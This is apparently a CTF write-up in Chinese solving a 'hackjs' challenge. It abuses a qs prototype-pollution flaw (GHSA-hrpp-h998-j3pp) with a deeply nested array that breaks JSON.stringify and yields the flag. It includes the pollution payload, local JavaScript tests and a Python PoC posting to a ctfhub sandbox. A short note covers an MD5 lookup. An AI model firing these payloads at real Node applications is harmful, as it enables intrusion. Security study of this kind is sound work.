# hackjs
	- 思路
		- 依赖qs版本过低，存在原型链污染漏洞
		- 构造过深的嵌套列表，使得JSON.stringify报错，并使用原型链污染构造特殊列表，使得此列表转为字符串后为`flag`
	- 依赖qs版本过低
		- 题目源码拿到手，安装npm报出了3个漏洞，`npm audit`报告说qs版本过低，给了一个[链接](https://github.com/advisories/GHSA-hrpp-h998-j3pp)
		- 查看拿到原型链污染的payload
			- ```
			  a[__proto__]=b&a[__proto__]&a[length]=100000000
			  ```
	- 构造payload
		- 使`JSON.stringify`报错
			- 构造一个很深的列表`[[[....]]]`即可
		- 本地测试发现
			- 构造这么一个对象时，toString在theProto上调用，而JSON.stringify在theObject上调用
			- ```js
			  let o = {
			      "name": "theObject"
			  }
			  o.__proto__ = ["theProto"]
			  console.log(o+"")
			  console.log(JSON.stringify(o))
			  ```
			- 所以可以这样子构造题目需要的venom.text
			- ```js
			  let l = ["x"]
			  for(let i = 0; i < 10000; i ++) {
			      l = [l]
			  }
			  
			  let a = {"key1": "x", "key2": l}
			  a.__proto__ = ["flag"]
			  console.log(a)
			  console.log(a+"")
			  ```
	- 最终PoC
		- ```python
		  manyzeros = "[0]" * 10000
		  payload = "venom[__proto__][welcome]=159753&venom[text][__proto__][]=flag&venom[text][key1]=x&venom[text][key2]MANYZEROS=x".replace("MANYZEROS", manyzeros)
		  
		  url = "http://venom-7a55695341796f4f.sandbox.ctfhub.com:57040/plz"
		  
		  r = requests.post(url, data=payload, headers = {
		      "Content-Type": "application/x-www-form-urlencoded"
		  })
		  print(r.text)
		  
		  ```
- # Checkin
	- `wget -r`下载题目源码，发现源码中有提示：`Quick pass cheat: I heard that Venom is ChaMd5’s, here is a mysterious string for you. 88d18c420654d158d22b65626bc7a878`
	- 用somd5.com查找给定md5即可
-